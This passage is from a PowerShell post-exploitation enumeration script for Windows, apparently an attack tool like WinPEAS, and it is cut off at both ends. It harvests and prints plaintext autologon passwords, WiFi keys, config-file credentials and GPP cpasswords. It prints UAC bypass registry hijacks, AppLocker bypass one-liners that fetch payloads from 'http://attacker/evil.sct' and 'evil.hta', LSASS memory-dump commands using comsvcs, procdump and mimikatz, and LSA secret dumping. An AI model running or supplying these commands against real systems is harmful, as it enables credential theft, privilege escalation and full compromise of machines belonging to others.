# Winlogon
$winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
if ($winlogon.DefaultUserName -or $winlogon.DefaultPassword) {
    Write-Vuln "Credentials in Winlogon registry"
    $VulnCount++
    Write-Exploit "Username: $($winlogon.DefaultUserName)"
    if ($winlogon.DefaultPassword) {
        Write-Vuln "PASSWORD FOUND: $($winlogon.DefaultPassword)"
    }
    Write-Exploit "Domain: $($winlogon.DefaultDomainName)"
}

# SNMP Community Strings
$snmpParams = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" -ErrorAction SilentlyContinue
if ($snmpParams) {
    Write-Vuln "SNMP Community Strings found"
    $VulnCount++
    Write-Exploit "Check: HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
}

# Putty Sessions
$puttySessions = Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction SilentlyContinue
if ($puttySessions) {
    Write-Vuln "PuTTY sessions found"
    $VulnCount++
    Write-Exploit "Sessions: $($puttySessions.Count)"
    Write-Exploit "Extract with: reg query HKCU\Software\SimonTatham\PuTTY\Sessions"
}

# VNC Passwords
$vncPaths = @(
    "HKCU:\Software\ORL\WinVNC3\Password",
    "HKLM:\SOFTWARE\RealVNC\WinVNC4"
)
foreach ($vncPath in $vncPaths) {
    if (Test-Path $vncPath) {
        Write-Vuln "VNC password registry key found"
        $VulnCount++
        Write-Exploit "Path: $vncPath"
        Write-Exploit "Decrypt with VNC password tools"
    }
}

# 6. SAM/SYSTEM backups
Write-Info "Checking for SAM/SYSTEM backups..."
$samBackups = @(
    "C:\Windows\repair\SAM",
    "C:\Windows\System32\config\RegBack\SAM",
    "C:\Windows\repair\system",
    "C:\Windows\System32\config\RegBack\system",
    "C:\Windows\System32\config\RegBack\SECURITY"
)

foreach ($backup in $samBackups) {
    if (Test-Path $backup) {
        Write-Vuln "SAM/SYSTEM backup found: $backup"
        $VulnCount++
        Write-Exploit "Copy to attacker machine and extract hashes"
        Write-Exploit "Tool: secretsdump.py -sam sam.hive -system system.hive LOCAL"
        Write-Exploit "Tool: samdump2 system.hive sam.hive"
    }
}

# 7. WiFi passwords
Write-Info "Checking for saved WiFi passwords..."
$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile"

if ($profiles) {
    Write-Vuln "WiFi profiles found: $($profiles.Count)"
    $VulnCount++
    
    foreach ($profile in $profiles | Select-Object -First 5) {
        $profileName = ($profile -split ':')[1].Trim()
        Write-Exploit "Profile: $profileName"
        
        # Try to extract password
        $profileInfo = netsh wlan show profile name="$profileName" key=clear 2>$null | Select-String "Key Content"
        if ($profileInfo) {
            $password = ($profileInfo -split ':')[1].Trim()
            Write-Exploit "  PASSWORD: $password"
        }
    }
    
    Write-Exploit "Command: netsh wlan show profile name='PROFILE' key=clear"
}

# 8. IIS Configuration Files
Write-Info "Checking for IIS configuration files..."
$iisConfigPaths = @(
    "C:\inetpub\wwwroot\web.config",
    "C:\Windows\System32\inetsrv\config\applicationHost.config"
)

foreach ($iisPath in $iisConfigPaths) {
    if (Test-Path $iisPath) {
        Write-Vuln "IIS config file found: $iisPath"
        $VulnCount++
        Write-Exploit "File may contain connection strings, credentials"
        Write-Exploit "Command: type '$iisPath' | findstr /i password"
        Write-Exploit "Command: type '$iisPath' | findstr /i connectionString"
    }
}

# 9. Database connection strings
Write-Info "Searching for database connection strings..."
$configExtensions = @("*.config", "*.xml", "*.ini")
$searchPaths = @("C:\inetpub", "C:\xampp", "$env:USERPROFILE")

foreach ($searchPath in $searchPaths) {
    if (Test-Path $searchPath) {
        foreach ($ext in $configExtensions) {
            $configs = Get-ChildItem -Path $searchPath -Filter $ext -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10
            foreach ($config in $configs) {
                $content = Get-Content $config.FullName -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString|password|pwd" -CaseSensitive:$false
                if ($content) {
                    Write-Vuln "Potential credentials in: $($config.FullName)"
                    $VulnCount++
                    foreach ($line in $content | Select-Object -First 2) {
                        Write-Exploit "  → $line"
                    }
                }
            }
        }
    }
}

# 10. Browser stored credentials
Write-Info "Checking for browser credential storage..."
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
)

foreach ($browserPath in $browserPaths) {
    if (Test-Path $browserPath) {
        Write-Vuln "Browser credential database found"
        $VulnCount++
        Write-Exploit "Path: $browserPath"
        Write-Exploit "Tool: LaZagne.exe browsers"
        Write-Exploit "Tool: SharpChrome.exe"
    }
}

# 11. Search for common password files
Write-Info "Searching for common password files..."
$passwordFilePatterns = @("*password*", "*cred*", "*.kdbx", "*backup*", "*secret*")
$searchLocations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")

foreach ($location in $searchLocations) {
    if (Test-Path $location) {
        foreach ($pattern in $passwordFilePatterns) {
            $files = Get-ChildItem -Path $location -Filter $pattern -File -ErrorAction SilentlyContinue | Select-Object -First 5
            foreach ($file in $files) {
                Write-Vuln "Suspicious file found: $($file.Name)"
                $VulnCount++
                Write-Exploit "Path: $($file.FullName)"
                Write-Exploit "Size: $($file.Length) bytes"
                Write-Exploit "Modified: $($file.LastWriteTime)"
            }
        }
    }
}

# 12. Cloud credentials
$cloudConfigPaths = @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.azure\credentials",
    "$env:USERPROFILE\.config\gcloud"
)

foreach ($cloudPath in $cloudConfigPaths) {
    if (Test-Path $cloudPath) {
        Write-Vuln "Cloud credentials found: $cloudPath"
        $VulnCount++
        Write-Exploit "Contains cloud access credentials"
    }
}

# ============================================================================
# 11. UAC BYPASS CHECK (ENHANCED)
# ============================================================================
Write-Host "`n[====== UAC CONFIGURATION CHECK ======]" -ForegroundColor Yellow
$uacLevel = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue

if ($uacLevel) {
    $enableLUA = $uacLevel.EnableLUA
    $consentPrompt = $uacLevel.ConsentPromptBehaviorAdmin
    $filterAdminToken = $uacLevel.FilterAdministratorToken
    
    Write-Info "UAC EnableLUA: $enableLUA"
    Write-Info "ConsentPromptBehaviorAdmin: $consentPrompt"
    Write-Info "FilterAdministratorToken: $filterAdminToken"
    
    if ($enableLUA -eq 0) {
        Write-Vuln "UAC is COMPLETELY DISABLED"
        $VulnCount++
        Write-Exploit "Admin commands will run without prompt"
        Write-Exploit "Elevation is automatic for administrators"
    } elseif ($consentPrompt -eq 0) {
        Write-Vuln "UAC set to never notify (Elevate without prompting)"
        $VulnCount++
        Write-Exploit "Elevation without prompt for administrators"
    } elseif ($consentPrompt -le 2) {
        Write-Vuln "UAC bypass possible (ConsentPromptBehaviorAdmin = $consentPrompt)"
        $VulnCount++
        Write-Exploit "Multiple UAC bypass techniques available:"
        Write-Exploit ""
        Write-Exploit "Method 1: fodhelper.exe bypass"
        Write-Exploit "  reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d 'cmd.exe' /f"
        Write-Exploit "  reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f"
        Write-Exploit "  fodhelper.exe"
        Write-Exploit ""
        Write-Exploit "Method 2: eventvwr.exe bypass"
        Write-Exploit "  reg add HKCU\Software\Classes\mscfile\shell\open\command /d 'cmd.exe' /f"
        Write-Exploit "  eventvwr.exe"
        Write-Exploit ""
        Write-Exploit "Method 3: sdclt.exe bypass"
        Write-Exploit "  reg add HKCU\Software\Classes\Folder\shell\open\command /d 'cmd.exe' /f"
        Write-Exploit "  reg add HKCU\Software\Classes\Folder\shell\open\command /v DelegateExecute /t REG_SZ /f"
        Write-Exploit "  sdclt.exe /KickOffElev"
        Write-Exploit ""
        Write-Exploit "Method 4: computerdefaults.exe bypass"
        Write-Exploit "  Similar to fodhelper"
        Write-Exploit ""
        Write-Exploit "Tool: UACME (60+ UAC bypass methods)"
        Write-Exploit "Tool: https://github.com/hfiref0x/UACME"
    }
    
    # Check for LocalAccountTokenFilterPolicy
    $tokenFilter = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -ErrorAction SilentlyContinue
    if ($tokenFilter.LocalAccountTokenFilterPolicy -eq 1) {
        Write-Vuln "LocalAccountTokenFilterPolicy is enabled"
        $VulnCount++
        Write-Exploit "Local admin accounts can connect remotely with full admin token"
        Write-Exploit "Allows PSexec, WMI, etc. with local admin account"
    }
}

# ============================================================================
# 12. APPLOCKER / WDAC BYPASS (ENHANCED)
# ============================================================================
Write-Host "`n[====== APPLOCKER / APPLICATION WHITELISTING CHECK ======]" -ForegroundColor Yellow
$applockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue

if ($applockerPolicy) {
    Write-Info "AppLocker is configured"
    $rules = $applockerPolicy | select -ExpandProperty RuleCollections
    
    Write-Vuln "AppLocker is active - Multiple bypass opportunities:"
    $VulnCount++
    
    Write-Exploit "=== Writable Allowed Directories ==="
    $writableAllowed = @(
        "C:\Windows\Tasks",
        "C:\Windows\Temp",
        "C:\Windows\tracing",
        "C:\Windows\Registration\CRMLog",
        "C:\Windows\System32\spool\drivers\color",
        "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
        "C:\Windows\System32\Tasks",
        "C:\Windows\SysWOW64\Tasks"
    )
    
    foreach ($dir in $writableAllowed) {
        if (Test-Path $dir) {
            try {
                $testFile = Join-Path $dir "test_$(Get-Random).exe"
                New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
                Remove-Item $testFile -Force
                Write-Exploit "  [WRITABLE] $dir"
            } catch {}
        }
    }
    
    Write-Exploit ""
    Write-Exploit "=== Alternative Execution Methods ==="
    Write-Exploit "  → regsvr32.exe /s /u /i:http://attacker/evil.sct scrobj.dll"
    Write-Exploit "  → mshta.exe http://attacker/evil.hta"
    Write-Exploit "  → mshta.exe vbscript:Execute('CreateObject(""Wscript.Shell"").Run ""cmd.exe""')"
    Write-Exploit "  → rundll32.exe javascript:'\..\mshtml,RunHTMLApplication ' ; alert('poc')"
    Write-Exploit "  → InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe"
    Write-Exploit "  → regasm.exe /U evil.dll"
    Write-Exploit "  → odbcconf.exe /S /A {REGSVR evil.dll}"
    Write-Exploit "  → ieexec.exe http://attacker/evil.exe"
    Write-Exploit "  → msbuild.exe bypass.xml"
    Write-Exploit "  → csc.exe /out:evil.exe bypass.cs"
    Write-Exploit "  → powershell.exe -EncodedCommand <base64>"
    Write-Exploit "  → wmic process call create 'cmd.exe'"
} else {
    Write-Info "AppLocker not configured"
}

# Check for Device Guard / WDAC
$deviceGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
if ($deviceGuard) {
    Write-Info "Device Guard/WDAC Status:"
    Write-Info "  SecurityServicesRunning: $($deviceGuard.SecurityServicesRunning)"
    if ($deviceGuard.SecurityServicesRunning -contains 1 -or $deviceGuard.SecurityServicesRunning -contains 2) {
        Write-Info "  Code Integrity is enabled"
    }
}

# ============================================================================
# 13. WINDOWS DEFENDER STATUS (ENHANCED)
# ============================================================================
Write-Host "`n[====== WINDOWS DEFENDER STATUS ======]" -ForegroundColor Yellow
$defender = Get-MpComputerStatus -ErrorAction SilentlyContinue

if ($defender) {
    Write-Info "Antivirus Enabled: $($defender.AntivirusEnabled)"
    Write-Info "RealTimeProtection: $($defender.RealTimeProtectionEnabled)"
    Write-Info "BehaviorMonitor: $($defender.BehaviorMonitorEnabled)"
    Write-Info "IoavProtection: $($defender.IoavProtectionEnabled)"
    Write-Info "OnAccessProtection: $($defender.OnAccessProtectionEnabled)"
    Write-Info "AntiSpyware: $($defender.AntispywareEnabled)"
    
    if (-not $defender.RealTimeProtectionEnabled) {
        Write-Vuln "Windows Defender Real-Time Protection is DISABLED"
        $VulnCount++
        Write-Exploit "Execute malicious binaries freely"
        Write-Exploit "No real-time scanning of files"
    }
    
    if (-not $defender.BehaviorMonitorEnabled) {
        Write-Vuln "Behavior Monitoring is DISABLED"
        $VulnCount++
        Write-Exploit "Suspicious behavior not monitored"
    }
    
    # Check exclusions
    $prefs = Get-MpPreference -ErrorAction SilentlyContinue
    if ($prefs) {
        if ($prefs.ExclusionPath) {
            Write-Vuln "Defender Exclusion Paths configured: $($prefs.ExclusionPath.Count)"
            $VulnCount++
            foreach ($path in $prefs.ExclusionPath) {
                Write-Exploit "Excluded: $path"
                
                # Check if we can write to excluded path
                if (Test-Path $path) {
                    try {
                        $testFile = Join-Path $path "test_$(Get-Random).exe"
                        New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
                        Remove-Item $testFile -Force
                        Write-Exploit "  [WRITABLE] Can place malware here!"
                    } catch {}
                }
            }
        }
        
        if ($prefs.ExclusionExtension) {
            Write-Vuln "Defender Exclusion Extensions: $($prefs.ExclusionExtension -join ', ')"
            $VulnCount++
            Write-Exploit "Files with these extensions not scanned"
        }
        
        if ($prefs.ExclusionProcess) {
            Write-Vuln "Defender Exclusion Processes: $($prefs.ExclusionProcess -join ', ')"
            $VulnCount++
        }
    }
    
    # Check signature age
    $sigAge = $defender.AntispywareSignatureAge
    if ($sigAge -gt 7) {
        Write-Vuln "Defender signatures are $sigAge days old"
        $VulnCount++
        Write-Exploit "Outdated signatures may not detect recent threats"
    }
} else {
    Write-Info "Windows Defender status not available"
}

# Check for other AV products
$avProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue
if ($avProducts) {
    Write-Info "Detected AV Products:"
    foreach ($av in $avProducts) {
        Write-Info "  → $($av.displayName)"
    }
}

# ============================================================================
# 14. NETWORK SERVICES CHECK (ENHANCED)
# ============================================================================
Write-Host "`n[====== NETWORK SERVICES CHECK ======]" -ForegroundColor Yellow
$connections = netstat -ano | Select-String "LISTENING"

Write-Info "Total listening ports: $(($connections | Measure-Object).Count)"

# Parse and categorize connections
$localhostServices = $connections | Select-String "127.0.0.1|::1"
$publicServices = $connections | Select-String -NotMatch "127.0.0.1|::1"

Write-Info "Localhost-only services: $(($localhostServices | Measure-Object).Count)"
Write-Info "Public listening services: $(($publicServices | Measure-Object).Count)"

# Check localhost services
Write-Host "`n[--- Localhost-Only Services ---]" -ForegroundColor Cyan
foreach ($conn in $localhostServices) {
    $parts = $conn -split '\s+' | Where-Object {$_}
    if ($parts.Count -ge 4) {
        $localAddr = $parts[1]
        $port = ($localAddr -split ':')[-1]
        $pid = $parts[4]
        
        # Get process info
        $process = Get-Process -Id $pid -ErrorAction SilentlyContinue
        $processName = if ($process) { $process.Name } else { "Unknown" }
        
        # Common vulnerable localhost services
        $vulnPorts = @{
            "14147" = "FileZilla Admin Interface - Extract FTP credentials"
            "25672" = "Erlang Port - Default cookie: rabbit"
            "5984" = "CouchDB - Often no authentication"
            "6379" = "Redis - No auth by default"
            "27017" = "MongoDB - No auth by default"
            "8083" = "Splunk - Check for weak/no auth"
            "9200" = "Elasticsearch - Often no auth"
            "3306" = "MySQL - Check for weak/no auth"
            "5432" = "PostgreSQL - Check for weak auth"
            "1433" = "MSSQL - Check for weak SA password"
            "8080" = "Various web services"
            "8000" = "Various web services"
            "3000" = "Various web services"
        }
        
        if ($vulnPorts.ContainsKey($port)) {
            Write-Vuln "Potentially vulnerable localhost service on port $port (PID: $pid - $processName)"
            $VulnCount++
            Write-Exploit "Service: $($vulnPorts[$port])"
            Write-Exploit "Process: $processName (PID: $pid)"
            
            switch ($port) {
                "14147" {
                    Write-Exploit "Connect: Telnet to 127.0.0.1:14147"
                    Write-Exploit "Extract FTP credentials from XML config"
                }
                "25672" {
                    Write-Exploit "Try default cookie: rabbit, COOKIE"
                    Write-Exploit "Tool: Erlang-arce exploit"
                }
                "5984" {
                    Write-Exploit "Browse to: http://127.0.0.1:5984/_utils/"
                    Write-Exploit "curl http://127.0.0.1:5984/_all_dbs"
                }
                "6379" {
                    Write-Exploit "Command: redis-cli -h 127.0.0.1"
                    Write-Exploit "Try: CONFIG GET *"
                }
                "27017" {
                    Write-Exploit "Command: mongo --host 127.0.0.1"
                    Write-Exploit "Try: show dbs"
                }
                "9200" {
                    Write-Exploit "curl http://127.0.0.1:9200/_cat/indices"
                }
            }
        } else {
            Write-Info "Port $port - $processName (PID: $pid)"
        }
    }
}

# Check public services for potential lateral movement
Write-Host "`n[--- Public Listening Services ---]" -ForegroundColor Cyan
$publicPorts = @()
foreach ($conn in $publicServices | Select-Object -First 20) {
    $parts = $conn -split '\s+' | Where-Object {$_}
    if ($parts.Count -ge 4) {
        $localAddr = $parts[1]
        $port = ($localAddr -split ':')[-1]
        if ($publicPorts -notcontains $port) {
            $publicPorts += $port
            $pid = $parts[4]
            $process = Get-Process -Id $pid -ErrorAction SilentlyContinue
            $processName = if ($process) { $process.Name } else { "Unknown" }
            Write-Info "Port $port - $processName (PID: $pid)"
        }
    }
}

# ============================================================================
# 15. NAMED PIPES (ENHANCED)
# ============================================================================
Write-Host "`n[====== NAMED PIPES ENUMERATION ======]" -ForegroundColor Yellow
$pipes = Get-ChildItem \\.\pipe\ -ErrorAction SilentlyContinue

Write-Info "Found $($pipes.Count) named pipes"

# Check for suspicious pipes
$suspiciousPipes = $pipes | Where-Object {
    $_.Name -like "*mojo*" -or 
    $_.Name -like "*msagent*" -or 
    $_.Name -like "*postex*" -or
    $_.Name -like "*status_*" -or
    $_.Name -like "*MSSE-*"
}

if ($suspiciousPipes) {
    Write-Vuln "Suspicious named pipes detected (possible C2/Malware):"
    $VulnCount++
    foreach ($pipe in $suspiciousPipes) {
        Write-Exploit "  → $($pipe.Name)"
    }
}

# Common named pipes to check
$interestingPipes = $pipes | Where-Object {
    $_.Name -like "*sql*" -or
    $_.Name -like "*spoolss*" -or
    $_.Name -like "*browser*"
}

if ($interestingPipes) {
    Write-Info "Interesting named pipes:"
    foreach ($pipe in $interestingPipes | Select-Object -First 10) {
        Write-Info "  → $($pipe.Name)"
    }
}

Write-Info "To check named pipe permissions, use accesschk.exe:"
Write-Exploit "Command: accesschk.exe -w \\.\pipe\* -v -accepteula"
Write-Exploit "Look for 'Everyone' or 'Users' with FILE_ALL_ACCESS"
Write-Exploit "Example exploit: WindscribeService pipe privilege escalation"

# ============================================================================
# 16. INSTALLED SOFTWARE VULNERABILITIES (ENHANCED)
# ============================================================================
Write-Host "`n[====== INSTALLED SOFTWARE CHECK ======]" -ForegroundColor Yellow

# Get software from multiple locations
$software = @()
$software += Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue
$software += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue

$uniqueSoftware = $software | Select-Object DisplayName, DisplayVersion, Publisher | Where-Object {$_.DisplayName} | Sort-Object DisplayName -Unique

Write-Info "Installed Software: $($uniqueSoftware.Count) packages"

# Known vulnerable software with exploitation info
$vulnSoftware = @{
    "FileZilla" = @{
        "Action" = "Check for stored FTP credentials"
        "Location" = "$env:APPDATA\FileZilla\recentservers.xml"
        "Exploit" = "Credentials stored in plaintext XML"
    }
    "PuTTY" = @{
        "Action" = "Check for stored SSH credentials"
        "Tool" = "LaZagne.exe"
        "Location" = "Registry: HKCU:\Software\SimonTatham\PuTTY\Sessions"
    }
    "WinSCP" = @{
        "Action" = "Check for stored credentials"
        "Tool" = "WinSCP password decryptor"
        "Location" = "Registry: HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions"
    }
    "VNC" = @{
        "Action" = "Check for weak/stored passwords in registry"
        "Location" = "HKLM:\SOFTWARE\RealVNC\WinVNC4"
        "Exploit" = "Password stored with weak encryption"
    }
    "TeamViewer" = @{
        "Action" = "Versions < 15 have vulnerabilities"
        "Exploit" = "CVE-2019-18988 - Password extraction"
    }
    "AnyDesk" = @{
        "Action" = "Check for weak configurations"
        "Location" = "$env:APPDATA\AnyDesk"
    }
    "Chrome" = @{
        "Action" = "Extract saved passwords"
        "Tool" = "SharpChrome.exe, LaZagne.exe"
        "Location" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    }
    "Firefox" = @{
        "Action" = "Extract saved passwords"
        "Tool" = "LaZagne.exe, firefox_decrypt"
        "Location" = "$env:APPDATA\Mozilla\Firefox\Profiles"
    }
    "mRemoteNG" = @{
        "Action" = "Extract stored credentials"
        "Exploit" = "confCons.xml contains encrypted credentials"
        "Tool" = "mRemoteNG password decryptor"
    }
    "KeePass" = @{
        "Action" = "Check for CVE-2023-32784 (master password in memory)"
        "Exploit" = "Extract master password from process memory"
    }
}

foreach ($app in $uniqueSoftware) {
    foreach ($vuln in $vulnSoftware.Keys) {
        if ($app.DisplayName -like "*$vuln*") {
            Write-Vuln "Potentially exploitable software: $($app.DisplayName) $($app.DisplayVersion)"
            $VulnCount++
            $vulnInfo = $vulnSoftware[$vuln]
            Write-Exploit "Software: $($app.DisplayName)"
            Write-Exploit "Action: $($vulnInfo.Action)"
            if ($vulnInfo.Tool) {
                Write-Exploit "Tool: $($vulnInfo.Tool)"
            }
            if ($vulnInfo.Location) {
                Write-Exploit "Location: $($vulnInfo.Location)"
                if (Test-Path $vulnInfo.Location) {
                    Write-Exploit "  [EXISTS] Found at location!"
                }
            }
            if ($vulnInfo.Exploit) {
                Write-Exploit "Exploit: $($vulnInfo.Exploit)"
            }
        }
    }
}

# Check for outdated software versions
$outdatedSoftware = @{
    "OpenSSH" = "7.7"
    "OpenSSL" = "1.1.1"
    "7-Zip" = "19.0"
}

foreach ($app in $uniqueSoftware) {
    foreach ($outdated in $outdatedSoftware.Keys) {
        if ($app.DisplayName -like "*$outdated*" -and $app.DisplayVersion -lt $outdatedSoftware[$outdated]) {
            Write-Vuln "Outdated software: $($app.DisplayName) $($app.DisplayVersion)"
            $VulnCount++
            Write-Exploit "Minimum safe version: $($outdatedSoftware[$outdated])"
        }
    }
}

# ============================================================================
# 17. GROUP POLICY / GPP PASSWORDS (ENHANCED)
# ============================================================================
Write-Host "`n[====== GROUP POLICY PREFERENCES CHECK ======]" -ForegroundColor Yellow

$gppPaths = @(
    "C:\ProgramData\Microsoft\Group Policy\History",
    "C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History"
)

# Add domain SYSVOL path if domain-joined
if ($env:USERDNSDOMAIN) {
    $gppPaths += "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
}

Write-Info "Searching for Group Policy Preferences files..."
$gppFiles = @()

foreach ($path in $gppPaths) {
    if (Test-Path $path) {
        $xmlFiles = Get-ChildItem -Path $path -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue
        
        foreach ($xmlFile in $xmlFiles) {
            $gppFiles += $xmlFile
            Write-Vuln "GPP XML file found: $($xmlFile.Name)"
            $VulnCount++
            Write-Exploit "File: $($xmlFile.FullName)"
            
            # Try to read and find cpassword
            $content = Get-Content $xmlFile.FullName -ErrorAction SilentlyContinue
            $cpasswords = $content | Select-String -Pattern 'cpassword="([^"]+)"' -AllMatches
            
            if ($cpasswords) {
                Write-Vuln "ENCRYPTED PASSWORDS FOUND IN GPP FILE!"
                foreach ($match in $cpasswords.Matches) {
                    $encryptedPass = $match.Groups[1].Value
                    Write-Exploit "Encrypted: $encryptedPass"
                    Write-Exploit "Decrypt with: gpp-decrypt $encryptedPass"
                    Write-Exploit "Or use Get-GPPPassword.ps1 from PowerSploit"
                }
            }
        }
    }
}

if ($gppFiles.Count -eq 0) {
    Write-Info "No GPP files found"
} else {
    Write-Exploit "Total GPP files found: $($gppFiles.Count)"
    Write-Exploit "Tool: Get-GPPPassword (PowerSploit)"
    Write-Exploit "Tool: Get-CachedGPPPassword"
}

# ============================================================================
# 18. WRITABLE SYSTEM DIRECTORIES (ENHANCED)
# ============================================================================
Write-Host "`n[====== SYSTEM PATH WRITE PERMISSIONS ======]" -ForegroundColor Yellow
Write-Info "Checking for writable system directories..."

$criticalDirs = @(
    "C:\Windows",
    "C:\Windows\System32",
    "C:\Windows\SysWOW64",
    "C:\Windows\Tasks",
    "C:\Windows\Temp",
    "C:\Windows\tracing",
    "C:\Windows\Registration\CRMLog",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
    "C:\Windows\System32\Tasks",
    "C:\",
    "C:\Program Files",
    "C:\Program Files (x86)"
)

foreach ($dir in $criticalDirs) {
    if (Test-Path $dir) {
        try {
            $testFile = Join-Path $dir "test_write_$((Get-Random)).txt"
            New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
            Remove-Item $testFile -Force
            
            Write-Vuln "WRITABLE SYSTEM DIRECTORY: $dir"
            $VulnCount++
            Write-Exploit "Directory: $dir"
            Write-Exploit "Exploit: Place malicious binaries for DLL hijacking"
            Write-Exploit "Exploit: Replace legitimate system binaries"
            Write-Exploit "Exploit: Create scheduled tasks"
            
            if ($dir -eq "C:\Windows\System32" -or $dir -eq "C:\Windows") {
                Write-Vuln "CRITICAL: Can write to $dir - FULL SYSTEM COMPROMISE"
            }
        } catch {}
    }
}

# ============================================================================
# 19. AUTOLOGON CREDENTIALS (ENHANCED)
# ============================================================================
Write-Host "`n[====== AUTOLOGON CREDENTIALS CHECK ======]" -ForegroundColor Yellow
$autologon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue

if ($autologon) {
    Write-Info "Checking Winlogon registry..."
    
    if ($autologon.AutoAdminLogon -eq "1") {
        Write-Vuln "AutoLogon is ENABLED"
        $VulnCount++
        Write-Exploit "DefaultUserName: $($autologon.DefaultUserName)"
        Write-Exploit "DefaultDomainName: $($autologon.DefaultDomainName)"
        
        if ($autologon.DefaultPassword) {
            Write-Vuln "PLAINTEXT PASSWORD FOUND IN REGISTRY!"
            Write-Exploit "Password: $($autologon.DefaultPassword)"
        }
        
        # Check for AltDefaultPassword
        if ($autologon.AltDefaultPassword) {
            Write-Vuln "Alternative password found: $($autologon.AltDefaultPassword)"
        }
    }
    
    # Check for other interesting Winlogon entries
    if ($autologon.LastUsedUsername) {
        Write-Info "Last Used Username: $($autologon.LastUsedUsername)"
    }
}

# Check LSA Secrets
Write-Info "LSA Secrets may contain credentials (requires SYSTEM)"
Write-Exploit "Tool: mimikatz 'privilege::debug' 'token::elevate' 'lsadump::secrets'"

# ============================================================================
# 20. LSASS DUMP POSSIBILITY (ENHANCED)
# ============================================================================
Write-Host "`n[====== LSASS DUMP CHECK ======]" -ForegroundColor Yellow

if ($privileges -match "SeDebugPrivilege") {
    Write-Vuln "Can dump LSASS process memory (SeDebugPrivilege enabled)"
    $VulnCount++
    
    # Get LSASS PID
    $lsassPID = (Get-Process lsass -ErrorAction SilentlyContinue).Id
    if ($lsassPID) {
        Write-Exploit "LSASS PID: $lsassPID"
    }
    
    Write-Exploit ""
    Write-Exploit "=== Method 1: ProcDump ==="
    Write-Exploit "  Download: https://live.sysinternals.com/procdump.exe"
    Write-Exploit "  Command: procdump.exe -accepteula -ma lsass.exe lsass.dmp"
    Write-Exploit "  OR: procdump.exe -accepteula -ma $lsassPID lsass.dmp"
    
    Write-Exploit ""
    Write-Exploit "=== Method 2: Task Manager ==="
    Write-Exploit "  1. Open Task Manager"
    Write-Exploit "  2. Details tab → Right-click lsass.exe"
    Write-Exploit "  3. Create dump file"
    Write-Exploit "  4. File saved to: C:\Users\USERNAME\AppData\Local\Temp\"
    
    Write-Exploit ""
    Write-Exploit "=== Method 3: Comsvcs.dll (Silent) ==="
    Write-Exploit "  Command: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsassPID C:\temp\lsass.dmp full"
    
    Write-Exploit ""
    Write-Exploit "=== Method 4: PowerShell ==="
    Write-Exploit '  $proc = Get-Process lsass'
    Write-Exploit '  $dumpFile = "C:\temp\lsass_$((Get-Date).Ticks).dmp"'
    Write-Exploit '  [System.Diagnostics.Process]::EnterDebugMode()'
    Write-Exploit '  rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $proc.Id $dumpFile full'
    
    Write-Exploit ""
    Write-Exploit "=== Method 5: Mimikatz Direct ==="
    Write-Exploit "  mimikatz.exe"
    Write-Exploit "  privilege::debug"
    Write-Exploit "  sekurlsa::logonpasswords"
    
    Write-Exploit ""
    Write-Exploit "=== Parse Dump Offline ==="
    Write-Exploit "  mimikatz.exe"
    Write-Exploit "  sekurlsa::minidump lsass.dmp"
    Write-Exploit "  sekurlsa::logonpasswords"
    Write-Exploit ""
    Write-Exploit "  OR: pypykatz lsa minidump lsass.dmp"
}

# Check if running as SYSTEM
if ($currentUser -like "*SYSTEM*") {
    Write-Vuln "Running as SYSTEM - Can dump LSASS directly"
    $VulnCount++
    Write-Exploit "Use any method above"
}

# ============================================================================
# 21. TOKEN IMPERSONATION (ENHANCED)
# ============================================================================
Write-Host "`n[====== TOKEN IMPERSONATION CHECK ======]" -ForegroundColor Yellow
Write-Info "Checking for impersonation opportunities..."

# Check current privileges
if ($privileges -match "SeImpersonatePrivilege.*Enabled" -or $privileges -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
    Write-Vuln "Token impersonation privileges available"
    $VulnCount++
